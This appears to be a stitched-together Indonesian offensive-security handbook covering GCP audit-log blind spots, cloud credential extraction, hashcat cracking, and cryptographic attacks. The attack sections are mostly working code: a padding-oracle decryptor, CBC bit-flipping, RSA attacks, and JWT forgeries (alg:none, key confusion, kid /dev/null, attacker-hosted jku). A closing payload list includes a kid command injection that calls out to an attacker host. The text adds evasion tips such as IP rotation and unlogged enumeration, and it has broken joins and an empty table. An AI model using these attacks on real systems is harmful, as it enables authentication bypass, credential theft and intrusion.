### 7.11.4 Jejak Audit Log GCP — jebakan praktis

```bash
# ambil semua Admin Activity (default on)
gcloud logging read 'logName="projects/PROJECT/logs/cloudaudit.googleapis.com%2Factivity"' \
  --freshness=7d --format=json | jq -r '.[] | [.timestamp, .protoPayload.methodName, .protoPayload.authenticationInfo.principalEmail] | @tsv'

# Data Access (harus di-enable dulu)
gcloud logging read 'logName="projects/PROJECT/logs/cloudaudit.googleapis.com%2Fdata_access"' \
  --freshness=7d --format=json
```

Poin operasional:
- **`GenerateAccessToken` dan `GenerateIdToken` adalah Data Access** — kalau Data Access log mati (default), impersonation tidak meninggalkan jejak.
- **`signJwt` / `signBlob` juga Data Access.** Enumeration yang "berhasil tapi tidak ada log" biasanya karena ini.
- **Activity Log tidak cover Kubernetes/GKE workload call ke K8s SA**: hanya tercatat di GKE audit log dan Cloud Logging dengan `logName=k8s_cluster`.
- **`SetIamPolicy` tercatat, tapi `GetIamPolicy` juga Admin Activity** — jadi banyak `GetIamPolicy` = indikasi enumeration meski Data Access mati.
- **Service Account `actAs`** tidak menghasilkan audit event tersendiri saat dipakai dari `gcloud`; jejaknya adalah `authenticationInfo.principalEmail=<user>` + `serviceAccountDelegationInfo.firstPartyPrincipal=<sa>` di event target.
- **`asset.searchAllResources` / `searchAllIamPolicies`** adalah Data Access — reconnaissance akan "silent" bila logging Data Access off.

### 7.11.5 Command set lengkap (triage cepat GCP)

```bash
# identity & reach
gcloud auth list --format='value(account,status)'
gcloud projects list --format='value(projectId)'
gcloud organizations list --format='value(name,displayName)'
gcloud projects get-iam-policy <p> --format=json > iam.json
gcloud iam service-accounts list --project <p>
gcloud iam roles list --project <p>

# fresh cred extraction
gcloud auth print-access-token
gcloud auth print-identity-token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# escalation liveness (baca-only dulu)
gcloud iam roles describe roles/editor
gcloud asset search-all-resources --scope=projects/<p> --limit=5 # konfirmasi asset API berjalan
```

## 7.12 Varian lintas-cloud & edge case 2024–2025

| Topik | AWS | Azure | GCP |
|---|---|---|---|
| **OIDC workload federation** | IAM OIDC provider `sub` wildcard → `sts:AssumeRoleWithWebIdentity`; event `AssumeRoleWithWebIdentity` | Federated Identity Credential pada app registration / user-assigned MI; token issuer condition `sub` terlalu longgar | Workload Identity Pool `attributeCondition='true'` → `sts.googleapis.com` issue SA token; methodName `google.identity.sts.v1.SecurityTokenService.ExchangeToken` (Data Access!) |
| **SSO/conditional bypass** | `iam:CreateLoginProfile` untuk user SSO (tidak butuh console pada IdP) | Per-app authentication policy longgar; `az rest` dari jaringan non-CA | `gcloud auth login --no-browser` + service account key |
| **Trust policy condition wildcard** | `"Principal": {"AWS": "*"}` pada `sts:AssumeRole` sering muncul dari template lama | `appRoleAssignedTo` tanpa restriction | `attributeCondition: "true"` di WIF provider |
| **Cross-account/tenant** | `AssumeRole` `ExternalId` yang hilang/lemah | Multi-tenant app + `adminConsent` | `iam.workloadIdentityPools` lintas project |
| **Token cache pitfall** | `sts` token 1 jam; `AssumeRole` chain bisa 12 jam dengan `DurationSeconds` (max role chaining 1 jam per hop) | ARM token ~1 jam, refresh via refresh token menurut CA/SIF | `gcloud auth print-access-token` 1 jam; `print-identity-token` <=1 jam |
| **Cred di CI/CD** | CodeBuild env var, GitHub OIDC to IAM | ADO service connection ID + secret, GitHub OIDC to Entra app | WIF dari GH Actions, GitLab OIDC |
| **Cred di artefak** | `.aws/credentials` di AMI/EBS snapshot, userdata EC2, ECS task env, EKS secrets, CodeCommit repo, S3 bucket public | ARM template parameter, pipeline secret (devops), App Settings Function, Key Vault access policy misconfig | `credentials.json` di VM image, Cloud Build trigger secret, GCS object public, Composer Airflow connection |

### 7.12.1 Edge case token & auth (baru 2024–2025)

- **AWS `sts:AssumeRoot`** (Nov 2024): memungkinkan principal dengan `sts:AssumeRoot` mengasumsikan root sesi terbatas per akun anggota (hanya untuk Org management account). Muncul `AssumeRoot` di CloudTrail — deteksi: eventName `AssumeRoot` dengan `requestParameters.taskPolicyArn` non-null. Ini jalur yang sebelumnya tidak ada untuk "root-ish" akses tanpa root.
- **AWS IAM Access Analyzer follow-up 2024**: `iam:SimulatePrincipalPolicy` sekarang bisa dipakai untuk assertion pada external access; enumeration dengan `SimulatePrincipalPolicy` tetap tercatat (eventName sama).
- **Azure `ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials` GA**: memungkinkan issuance token MI dari issuer arbitrary → **kombinasi baru 2024** untuk persistence tanpa SP key. Audit call: `microsoft.managedidentity/userassignedidentities/federatedidentitycredentials/write`.
- **Azure `Authentication Methods` / `Temporary Access Pass`** misuse: bila attacker punya `UserAuthenticationMethod.ReadWrite.All`, bisa set TAP ke korban → login. Audit `directoryAudits` activity `Admin registered security info`.
- **GCP `GenerateAccessToken` audit Data Access** (sejak ~2023): kalau di-enable, mint SA token tercatat dengan `protoPayload.methodName="GenerateAccessToken"` dan `serviceAccountDelegationInfo`.
- **GCP `sts ExchangeToken` Data Access**: semua WIF exchange — kalau logging on, grep `ExchangeToken` di Data Access log.
- **AWS EKS Pod Identity** (GA 2023): menggantikan IRSA. Pod identity association bisa dipakai untuk privesc jika `eks:CreatePodIdentityAssociation` tersedia + `iam:PassRole` → pod as role apapun. Cek event `CreatePodIdentityAssociation`, `TagResource` di EKS.
- **Cloud Run `run.services.update`** + `iam.serviceAccounts.actAs`: swap SA ke SA admin, traffic tetap. Audit `google.cloud.run.v1.Services.ReplaceService`.
- **Azure Container Apps** analog: `Microsoft.App/containerApps/write` + `assign` MI.

### 7.12.2 Jebakan operasional enumerasi (semua cloud)

- **Enumeration "silent" di GCP Data Access-off** — jangan simpulkan "tidak ada aktivitas" sampai `logging settings` per project dicek.
- **`GetCallerIdentity` di AWS tidak punya resources** — banyak trail management events filter berdasarkan field `resources`, jadi event ini bisa absen. Jangan pakai ketiadaannya sebagai bukti.
- **Activity Log Azure hanya control plane** — enumerasi via Graph (`az rest`) masuk ke `AuditLogs` Entra, bukan Activity Log. IR wajib union.
- **`PassRole`/`actAs` bukan event di AWS dan GCP** — jejaknya sebagai authorization check di event pemanggil. Grep `errorCode`/`authorizationError` pada event target, atau `serviceAccountDelegationInfo` di GCP.
- **Simulate/can-i probe sendiri**: `iam simulate-principal-policy` (AWS), `az rest POST providers/Microsoft.Authorization/checkAccess` (Azure), `gcloud policy-troubleshoot iam` / `gcloud asset analyze-iam-policy` (GCP) — semuanya bisa terdeteksi sebagai "attacker mencoba memahami permission". Tim biru sering tidak menandai ini karena bukan "aktivitas destruktif".
- **Rotation check enumerasi**: pasca-rotation, Access Key ID lama bisa muncul di `LookupEvents` ketika dipakai. Cek `userIdentity.accessKeyId` unik sebagai pivot, bukan hanya user.
- **IAM entity tag hijack** (AWS 2023+): role dengan condition `aws:PrincipalTag/team` bisa diubah tag-nya sendiri jika punya `iam:TagRole` + `iam:UntagRole` + permission tag yang lebih longgar. Event: `TagRole`, `UntagRole`.
- **Azure `elevateAccess`** idempotent — panggilan kedua tidak error meski sudah aktif, jadi "tidak ada error" ≠ "baru diaktifkan". Cek `directoryAudits` untuk waktu aktivasi.
- **GCP `roles/owner` di project ≠ org admin** — masih bisa di-block oleh org policy (`iam.allowedPolicyMemberDomains`, `iam.disableServiceAccountKeyCreation`). Cek org policy sebelum menyimpulkan "full control".
- **Cloud-specific network deny** (SCP di AWS Org, Azure Management Lock + Deny Assignments, GCP `iam.allowedPolicyMemberDomains` + VPC Service Controls) bisa membuat "permission ada di policy tapi gagal di runtime". VPC-SC `ERR_VPC_SERVICE_CONTROLS` di GCP adalah jebakan klasik saat enumerasi storage/BQ.

### 7.12.3 Rangkuman jejak minimum yang harus dicek saat IR (per cloud)

| Cloud | Sumber utama | Yang sering hilang |
|---|---|---|
| AWS | CloudTrail management events | `GetCallerIdentity`, `PassRole`, `GetSessionToken` (kadang), data events (S3 object, Lambda invoke detail) |
| Azure | Activity Log + Entra `AuditLogs` + Sign-in logs | ARM token issue terhadap MI, `az rest` Graph ops (masuk Entra), MI IMDS |
| GCP | Admin Activity + Data Access (harus on) | `GenerateAccessToken`, `SignJwt`, `ExchangeToken`, `AccessSecretVersion`, `searchAll*`, GKE API calls (audit K8s terpisah) |

## 1. Hash Cracking (Hashcat)

### 1.1 Mode Penting

| Mode | Hash | Contoh |
|------|------|--------|

### 1.2 Perintah Dasar

```bash
# Salt + wordlist
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# Rule-based mangling (best64 umum; dive lebih agresif)
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule

# Combinator (dua wordlist)
hashcat -m 0 -a 1 md5.txt words1.txt words2.txt -j '$-' -k '$2024'

# Mask (brute force terstruktur)
hashcat -m 0 -a 3 md5.txt '?u?l?l?l?l?d?d?d?s'           # 8 char + digit + symbol
hashcat -m 0 -a 3 md5.txt '?u?l?l?l?l?l?d?d?d?d' -i --increment-min=6

# Hybrid (wordlist + mask)
hashcat -m 1000 -a 6 ntlm.txt rockyou.txt '?d?d?d?d'

# Tuning GPU vs memory
hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt -D 1,2 -w 4 --kernel-accel=128 --kernel-loops=1024

# Restore / status
hashcat --session=red1 --restore
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt --status --status-timer=10 --potfile-disable
```

### 1.3 Mask Charset

```
?l a-z   ?u A-Z   ?d 0-9   ?s !"#$...  ?a ?l?u?d?s   ?b 0x00-0xff
-c  ?l?u  -1 ?l?d   custom set
```

Contoh mask NTLM dengan prefix `P@ss`:
```bash
hashcat -m 1000 -a 3 ntlm.txt -1 '?l?d' 'P@ss?1?1?1?1'
```

### 1.4 Kapan gagal
- Bcrypt `$2b$` cost ≥ 12: 100× lebih lambat — pakai rule + wordlist, bukan mask.
- Hanya hash saja (tanpa salt digest/LM): pastikan `hashid -m` cocok; salah mode = 0 hasil.
- GPU thermal throttle: pantau `nvidia-smi dmon`; `-w 4` bisa memicu throttle dan lebih lambat dari `-w 3`.
- Hashcat 7.1.2 default ke OpenCL runtime — pada driver NVIDIA 550+ install `hashcat` via paket distro dengan CUDA backend.

## 2. Length Extension Attack

**Apa yang dikirim:** `hash(secret || message)` (Merkle–Damgård: MD5, SHA1, SHA256, SHA512) + `message || padding || attacker_appendix`.
**Apa yang muncul:** MAC valid untuk pesan yang diperpanjang.
**Kenapa berhasil:** state internal setelah hashing = output hash; attacker bisa lanjut dari state itu.

### Deteksi
- Parameterisasi seperti `?user=admin&role=user&sig=...` di mana `sig = md5(secret + query)`.
- API signature header (routing, payment gateway) berbasis HMAC palsu.

### Skrip (Python 3.11 + `hashpumpy` / `hlextend`)

```python
# pip install hlextend
import hlextend
sha = hlextend.new('sha256')
original = b'user=guest&role=user'
sig = 'a1b2c3...'                              # dari target
# append '&role=admin'
new_msg, new_sig = sha.extend(b'&role=admin', original, 8, sig)  # keylen=8 (brute 1-32)
print(new_msg.hex(), new_sig)
```

Curl ke endpoint:
```bash
curl -s "https://target/api/data?$(python3 -c "print(bytes.fromhex('<hex>').decode('latin1'))")" \
  -H "X-Signature: <new_sig>"
```

Alternatif tool: `padbuster` mode `-hash`, atau `hash_extender`:
```bash
hash_extender --data "user=guest&role=user" --secret-min=1 --secret-max=32 \
  --append "&role=admin" --signature a1b2c3... --format sha256
```

### Kapan gagal
- Target pakai HMAC (SHA256-HMAC): length extension **tidak berlaku**.
- Framework WAF (Cloudflare) menormalkan `\x80` — payload harus dikirim sebagai bytes mentah (curl `--data-binary`, bukan `-d`).
- Secret tidak di-prepend (mis. `hash(msg + secret)`) — gunakan serangan lain.

---

## 3. ECB Cut-and-Paste

**Apa yang dikirim:** ciphertext blok ECB yang disusun ulang dari blok sah lain (tidak butuh key).
**Apa yang muncul:** plaintext hasil rekombinasi.
**Kenapa berhasil:** ECB enkripsi tiap blok identik → blok identik menghasilkan ciphertext identik; mudah "dirobek" per 16 byte.

### Deteksi
- Ciphertext terlihat sebagai hex panjang (kelipatan 16), biasanya via cookie/base64.
- Enkripsi ECB: blok plaintext berulang → blok ciphertext berulang.

```python
# Deteksi ECB oracle
def is_ecb(oracle):
    ct = oracle(b'A' * 48)
    blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
    return len(blocks) != len(set(blocks))
```

### Skrip (cookie `user=<x>&role=user` dienkripsi AES-ECB)

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import requests

def oracle(pt: bytes) -> bytes:                     # endpoint proxy
    return bytes.fromhex(requests.get(f'http://t/?inp={pt.hex()}').text)

BS = 16
# Blok A: "AAAAAAA A&role=us er......" → siapkan offset agar "role=user" jatuh di blok penuh
# Blok B: dapatkan ciphertext "admin" dengan injection offset
target = b'role=admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'  # PKCS7 pad
# cari dengan offset shift 1..15 sampai blok (16-byte) target muncul sendiri
```

Praktik umum via `padbuster` atau `ecb_tool`:
```bash
# ecb_oracle (matasano set 2 chall 12-14) — baca password via oracle
python3 ecb_oracle.py --url https://t/?inp= --block 16 --prefix 0
```

### Kapan gagal
- Server memakai AES-CBC + random IV atau GCM: serangan tidak berlaku.
- Name/value sanitizer memblok `&` sebelum enkripsi (invalidasi rekombinasi).
- Ciphertext ada HMAC diinginkan di luar blok — milih cut-and-paste gagal karena auth tag berubah.

---

## 4. Padding Oracle (CBC)

**Apa yang dikirim:** ciphertext dengan satu byte blok sebelumnya dimodifikasi; ukur respons beda antara 200/500 atau timing beda.
**Apa yang muncul:** plaintext akhir satu byte per request, iteratif → full decrypt + forge.
**Kenapa berhasil:** CBC decrypt = `P_i = D(C_i) ⊕ C_{i-1}`; mengubah C_{i-1} mempengaruhi P_i; server reveal padding invalid vs valid.

### Payload template (curl probe)

```bash
CT=...                                   # hex/base64 dari cookie
PT_BLOCK=$((16*${BLOCK_IDX}))
# Modify byte ke-i di blok C_{i-1}
python3 - <<'PY'
import base64
ct = bytearray(base64.b64decode("<ct>"))
ct[15] ^= 0x01                             # ubah byte terakhir blok sebelumnya
print(base64.b64encode(ct).decode())
PY
```

### Skrip `padbuster` (cara paling praktis)

```bash
padbuster https://target/profile "vQ7bKeY7nR5t..." 16 \
  -cookies "auth=vQ7bKeY7nR5t...; lang=en" \
  -encoding 0 -error "Invalid padding" -plaintext "user=guest"
```

### Skrip Python (oracle beda status/timing)

```python
import requests, base64
URL = 'https://target/profile'
CT  = base64.b64decode('<cipher>').hex()
BS  = 16

def oracle(ct_hex):
    r = requests.post(URL, data={'cipher': ct_hex})
    return r.status_code != 500   # True = padding valid

def decrypt(ct_hex):
    ct = bytearray.fromhex(ct_hex)
    blocks = [ct[i:i+BS] for i in range(0, len(ct), BS)]
    pt = b''
    for i in range(len(blocks)-1, 0, -1):
        prev = bytearray(blocks[i-1])
        dec = bytearray(BS)
        inter = bytearray(BS)
        for pad in range(1, BS+1):
            for guess in range(256):
                prev[BS-pad] = (inter[BS-pad] ^ pad) ^ guess
                test = bytes(prev) + bytes(blocks[i])
                if oracle(test.hex()):
                    inter[BS-pad] = guess ^ pad
                    break
            for j in range(BS-pad, BS):
                prev[j] = inter[j] ^ (pad+1)
        pt = bytes(a ^ b for a, b in zip(inter, blocks[i-1])) + pt
    return pt
```

### Kapan gagal
- Server sudah pakai **Encrypt-then-MAC** atau AEAD (GCM/ChaCha20-Poly1305) → padding oracle tidak ada.
- Constant-time response + 500 untuk semua error (WAF normalisasi error).
- HTTP/2 + `nginx 1.25` membatasi jumlah request paralel; padbuster default paralel 10 bisa reset — pakai `-parallelism 1` + delay.
- CT byte memiliki HMAC di akhir (double-submit) → tidak bisa forge tanpa key.

---

## 5. CBC Bit Flipping

**Apa yang dikirim:** `C_{i-1} ^= delta` untuk mengubah `P_i` tanpa tahu key.
**Apa yang muncul:** plaintext target dari blok P_i, merusak P_{i-1} (garbage).
**Kenapa berhasil:** CBC: `P_i = D(C_i) ⊕ C_{i-1}` — manipulasi C_{i-1} langsung XOR ke plaintext blok i.

### Kasus klasik: cookie `role=user` → `role=admin`

```python
import base64
ct = bytearray(base64.b64decode('<cookie_ct>'))
# Plaintext block 1: b'...role=user.....', target role=admin
# delta = b'user' XOR b'min\x00' untuk 4 byte di posisi role
orig  = b'user'
new   = b'admin'[:4]                                  # 'admi' vs 'user' panjang beda → geser
# Untuk awal "user" → "admi" — tidak akan match string role=, gunakan flip posisi dgn padding
# Baseline hitung delta jika panjang tetap:
delta = bytes(a ^ b for a, b in zip(b'user', b'adm%')) # placeholder
```

Contoh konkret panjang tetap `role=user` (9 byte) → `role=admi` + byte junk (padding asli bila server tidak cek `role=` prefix):

```python
block_target = 1                         # indeks blok plaintext yang ditargetkan
offset = 5                               # posisi dalam blok
delta = bytes([ord('u')^ord('a'), ord('s')^ord('d'), ord('e')^ord('m'), ord('r')^ord('i')])
for i, d in enumerate(delta):
    ct[(block_target-1)*16 + offset + i] ^= d
print(base64.b64encode(ct).decode())
```

### Kapan gagal
- IV ter-autentikasi (HMAC) → flip merusak MAC.
- Server memvalidasi `role` dengan allowlist setelah decrypt tapi sebelum auth-check? Tidak mungkin: role adalah target deserialize — validasi biasanya di dua tempat; bila dua tempat → butuh juga flip blok auth (lewat orakel).
- Panjang `user` ≠ `admin` tanpa padding modul 16: butuh orakel padding (lihat §4).
- Encoding cookie (URL-safe base64 vs standar) → decode salah. Cek `%3D`, `-`, `_`.

---

## 6. Serangan RSA

### 6.1 Common Modulus

**Dikirim:** dua ciphertext ke public key (n, e1) dan (n, e2), dengan gcd(e1,e2)=1.
**Muncul:** plaintext m asli via Bézout.
**Kenapa berhasil:** `m^{a·e1 + b·e2} = m` bila `a·e1 + b·e2 = 1`.

```python
from math import gcd
def egcd(a,b):
    if b==0: return (a,1,0)
    g,x1,y1 = egcd(b, a%b); return (g, y1, x1-(a//b)*y1)
def common_modulus(n, e1, c1, e2, c2):
    g, a, b = egcd(e1, e2); assert g == 1
    def inv(x, m): return pow(x, -1, m)
    if a < 0: c1 = inv(c1, n); a = -a
    if b < 0: c2 = inv(c2, n); b = -b
    return (pow(c1, a, n) * pow(c2, b, n)) % n
```

### 6.2 Wiener (small d)

**Dikirim:** public (n, e) → faktor n.
**Muncul:** d bila `d < n^{0.25}/3`.
**Kenapa berhasil:** convergents dari e/n menghasilkan k/d.

```python
# pip install owiener
import owiener
d = owiener.attack(e, n)
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]))
```

### 6.3 Hastad Broadcast (small e, no padding)

**Dikirim:** ciphertext dari ≥ e kunci berbeda, modulus co-prime, pesan sama.
**Muncul:** CRT rekonstruksi `m^e`, akar ke-e.
**Kenapa berhasil:** `m^e < Π n_i` → exact integer root.

```python
from sympy.ntheory.modular import crt
from gmpy2 import iroot
ns = [n1, n2, n3]; cs = [c1, c2, c3]
m_e, _ = crt(ns, cs)
m, exact = iroot(int(m_e), 3)
assert exact
print(bytes.fromhex(hex(int(m))[2:]))
```

### 6.4 Shared Prime (batch GCD)

**Dikirim:** dua public key RSA `n1, n2`.
**Muncul:** faktor `p = gcd(n1, n2)` bila PRNG lemah/reuse.
**Kenapa berhasil:** modulus berbagi faktor prima.

```python
from math import gcd
def shared_prime(n1, n2):
    p = gcd(n1, n2)
    if p == 1: return None
    return p, n1//p, n2//p
```

Batch (data dump sertifikat):
```bash
# tool: RsaCtfTool (crypto-attacks), atau badkeys
badkeys --update-bl
badkeys -a scan pubkey.pem
```

RsaCtfTool satu pintu:
```bash
# install: git clone https://github.com/RsaCtfTool/RsaCtfTool
python3 RsaCtfTool.py --publickey pub.pem --private
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile ct.bin --attack wiener
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile ct.bin --attack common_modulus \
  --cm-publickey2 pub2.pem --cm-cipherfile2 ct2.bin
```

### Kapan gagal
- Padding (OAEP/PKCS#1 v1.5) aktif: Hastad butuh kosong; OAEP melawannya (randomisasi).
- `e` besar (≥ 65537) dengan padding OK: Wiener, Hastad tidak berlaku.
- Faktorisasi hanya ketika `n1 ∩ n2 > 1` — umumnya dari generator firmware embedded (router, IoT).
- RsaCtfTool butuh SageMath untuk banyak attack; tanpa Sage → banyak attack silent fail. Cek `which sage`.

---

## 7. JWT Crypto Abuse

### 7.1 `alg: none`

**Dikirim:** JWT dengan header `{"alg":"none"}` + signature kosong.
**Muncul:** server yang tidak memaksa alg → terima token tanpa verifikasi.
**Kenapa berhasil:** library / config lama menerima `none`.

```bash
python3 - <<'PY'
import base64, json
h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
print((h+b'.'+p+b'.').decode())
PY
```

Variasi case: `None`, `NONE`, `nOnE` (CVE-2015-9235 lama di `jsonwebtoken` npm < 4.2.2).

### 7.2 Algorithm Confusion RS256 → HS256

**Dikirim:** header `{"alg":"HS256"}`, signature dihitung dengan **public key RSA sebagai HMAC-secret** (PEM).
**Muncul:** server memverifikasi HMAC dengan public key → valid.
**Kenapa berhasil:** library `jsonwebtoken` (node) < 9 / `pyjwt` < 2.4 tanpa `algorithms=["RS256"]` eksplisit; verifier pakai secret sama dengan pemverifikasi algoritma yang diklaim.

```python
# pip install pyjwt cryptography
import jwt, requests
pubkey = requests.get('https://target/.well-known/jwks.json').json()   # atau /jwks.json
# konversi JWK → PEM (pakai jwcrypto)
from jwcrypto import jwk
k = jwk.JWK(**pubkey['keys'][0]); pem = k.export_to_pem()
token = jwt.encode({"sub":"admin","role":"admin"},
                   pem, algorithm="HS256")
print(token)
```

Bandingkan juga public key dalam PEM vs `-----BEGIN PUBLIC KEY-----` (pyjwt pakai raw bytes, node pakai pem string — coba kedua format).

### 7.3 `kid` Injection

**Dikirim:** header `{" kid":"../../../../dev/null" }` atau `{"kid":"/etc/passwd"}`.
**Muncul:** server membuka file path ↔ secret = contents; bila kosong → secret = "" (HMAC forgeable).

```python
# kid = /dev/null → HMAC secret string kosong
import hmac, hashlib, base64, json
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
h = b64(json.dumps({"alg":"HS256","kid":"/dev/null"}).encode())
p = b64(json.dumps({"sub":"admin"}).encode())
sig = b64(hmac.new(b'', f'{h.decode()}.{p.decode()}'.encode(), hashlib.sha256).digest())
print(f"{h.decode()}.{p.decode()}.{sig.decode()}")
```

Variasi SQLi kid: `kid: "x' UNION SELECT 'secret'--"` di backend yang mengambil key dari DB.

### 7.4 JWKS Injection / SSRF via `jku`, `x5u`

**Dikirim:** header `{"jku":"https://attacker/jwks.json","alg":"RS256"}`.
**Muncul:** server fetch JWKS dari URL attacker → verifikasi token dengan key attacker.
**Kenapa berhasil:** tidak ada allowlist host `jku`.

```bash
# 1) Host jwks.json di attacker (attacker key pair)
openssl genrsa -out atk.pem 2048
openssl rsa -in atk.pem -pubout -out atk.pub
python3 - <<'PY'
import json, base64
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.asymmetric import rsa
import base64
pub = load_pem_public_key(open('atk.pub','rb').read())
nums = pub.public_numbers()
def b64u(i): 
    b = i.to_bytes((i.bit_length()+7)//8,'big'); return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
print(json.dumps({"keys":[{"kty":"RSA","n":b64u(nums.n),"e":b64u(nums.e),"kid":"atk"}]}))
PY
# 2) Sign token dengan atk.pem + header jku ke URL di atas
```

### 7.5 Weak HMAC Secret (jwt-cracker)

```bash
# pip install pyjwt; pakai hashcat: mode 16500 (JWT HS256)
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# jwt_tool (opsional, python)
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
# Setelah crack:
python3 jwt_tool.py <token> -T -S hs256 -p '<secret>'
```

### Kapan gagal
- `algorithms=["RS256"]` hardcoded → node `jsonwebtoken` ≥ 9, pyjwt ≥ 2.4 aman dari confusion.
- `kid` path traversal di-block `os.path.basename` atau allowlist key id map.
- `jku`/`x5u` di-allowlist ketat di API gateway (Kong 3.6+, AWS API Gateway default tidak fetch).
- Keycloak 24.x, Auth0 rules default sudah verifikasi `keys` server-side terhadap JWKS yang di-pin; `jku` diabaikan.
- Signature base64 decode salah: JWT pakai `-` `_` (URL-safe), bukan `+` `/`; `str.replace('=','')` wajib.

---

## 8. Jebakan Operasional (yang membuat serangan gagal di lapangan)

1. **Encoding mismatch** — length extension & CBC flip paling sering gagal karena target meng-URL-decode `%80`/NUL, atau `curl -d` mengubah `+` → spasi. Kirim `--data-binary` dan `Content-Type: application/octet-stream`.
2. **WAF normalisasi** — Cloudflare/Akamai menormalkan whitespace, trailing bytes, dan base64. Payload biner harus lewat `POST` body atau header mentah; GET query string akan corrupt.
3. **Rate limit per-IP** — padding oracle butuh ribuan request; pakai IP rotator atau `--delay`; nginx 1.25 `limit_req` default akan 429 di 10 rps.
4. **HTTP/2 stream** — padbuster v1.2 (lama) tidak handle h2; pakai `--load-balancer` atau `-H "Connection: close"` untuk downgrade.
5. **Cookie SameSite/Host** — CBC/JWT abuse pada cookie dengan `SameSite=Strict` tetap bisa diserialisasi via browser devtools, tapi rotation `__Host-` prefix butuh `Path=/` match persis.
6. **Time skew di JWT** — `exp` tidak dipalsukan; jika token ditolak, cek `iat`/`nbf`; target dengan drift NTP > 30s (umum Windows 11 24H2 tanpa time sync) bisa reject atau accept tak terduga.
7. **Hashcat driver drift** — hashcat 7.x pada ROCm 6.1 punya regression `-m 22000`; downgrade ke hashcat 6.2.6 atau compile OpenCL. Cek `hashcat -I` untuk device yang terdeteksi.
8. **GPU memory OOM** — mask `?a?a?a?a?a?a?a?a` butuh > 24 GB VRAM setelah workload; hashcat akan "out of memory" tapi tidak crash — cek `--status` menampilkan 0 H/s (silent). Pakai `-d 1` per device atau kurangi `-n`.
9. **Library crypto versi** — pyjwt < 2.4 rentan confusion; target bisa saja upgradable. Cek `Server:`, error verbose (`jwt.exceptions.InvalidAlgorithmError`) untuk fingerprint versi.
10. **RSA padding identity** — RSA-CTF tool "wiener" sukses hanya jika `d` kecil. Jika key 2048-bit dengan d setara modulus, attack silent benar-benar hilang. Cek `e` eksentrik (`e=3` — kandidat Hastad, `e=1` — m=c).
11. **JWT jku** — endpoint jwks attacker harus HTTPS dengan sertifikat valid; backend Node `node-fetch` reject self-signed. Siapkan Let's Encrypt (atau via `ngrok`/`cloudflared` tapi domain publik harus di-resolve).
12. **JWT header `crit`** — beberapa library menolak header dengan `crit` tidak dikenal → token ditolak sebelum verifikasi. Strip `crit` saat forge.
13. **Brute force wordlist salah garam** — kerberoast mode 13100 gagal jika ticket pakai AES (etype 17/18). Detect via `--example-hashes`; ganti `-m 19600`/`19700` + wordlist adaptif.
14. **Length extension di request ber-signature query-string**: string diurutkan alphabetic oleh framework (Spring `UriComponentsBuilder`), jadi append di akhir akan diurutkan ulang — payload harus disisipi pada parameter yang juga jadi tempat injeksi (`&role=admin` di posisi yang tidak di-sort ulang, mis. fragment atau body).
15. **Padding oracle multi-stack** — TLS offload (nginx) bisa merespons error 400 sebelum aplikasi (padding) → oracle hilang. Uji dulu dengan byte corrupt yang pasti invalid, lihat apakah respons beda di layer TLS.
16. **ECB cut-and-paste di JSON serializer** — banyak backend menambahkan field random di antara blob, jadi blok plaintext tidak align dengan 16 byte. Tambahkan prefix `A * (16 - offset)` per request — tanpa itu ciphertext akan bergeser 1 byte dan test selalu mismatch.


## w2-jwt-corpus

# w2-jwt-corpus — crypto

# Bab Referensi: JWT Attack Korpus — 12 Payload Literal

**Lingkup versi diuji:** PyJWT 2.8.0 / 2.9.0, python-jose 3.3.0, jose4j 0.9.3, nimbus-jose-jwt 9.37, hashicorp/go-jose v4, Auth0 node-jsonwebtoken 9.0.2, jwt-decode 4.0.0. Hashcat 6.2.6. OpenSSL 3.0.13 (Ubuntu 24.04). nginx 1.25.3 (jku/x5u SSRF callback server). Chrome 131, curl 8.5.0.

**Struktur body JWT:** `base64url(header) . base64url(payload) . base64url(signature)`. Semua payload di bawah ini literal—copy-paste ke `$H` / `$P` / `$S` lalu rakit.

---

## Ringkasan 12 Vektor

| # | Vektor | Header kunci | Prasyarat server | Efek |
|---|---|---|---|---|
| 1 | alg:none | `alg:"none"` | library menerima none + sig kosong | bypass auth total |
| 2 | HS256 signed w/ public key | `alg:"HS256"` | kunci verifikasi RS/ES di-reuse sbg HMAC secret | forge token |
| 3 | kid path traversal | `kid:"../../dev/null"` | kid dipakai untuk baca file | sig cocok scr empty |
| 4 | kid SQLi | `kid:"x' UNION SELECT 'secret'--"` | kid masuk query DB | kunci terkontrol |
| 5 | kid command injection | `kid:"a|curl http://atk/` | kid masuk shell | RCE out-of-band |
| 6 | kid XSS | `kid:"<script>…</script>"` | kid dirender di UI admin | stored XSS |
| 7 | jwk injection | `jwk:{…}` self-signed | server mempercayai `header.jwk` | forge token |
| 8 | jku SSRF | `jku:"http://atk/jwks.json"` | server fetch jku tanpa allowlist | ambil kunci attacker |
| 9 | x5u SSRF | `x5u:"http://atk/cert.pem"` | server fetch x5u sbg cert | forge + SSRF |
| 10 | child claim injection (script) | `"name":"{{7*7}}"` | template engine render claim | SSTI → RCE |
| 11 | KID parameter collision | `kid` duplikat / `kid=secret` | dict lookup vs array ambil | kunci salah dipakai |
| 12 | weak HMAC disclosed | HS256 weak secret | secret bocor via `.git`, log | crack offline |

---

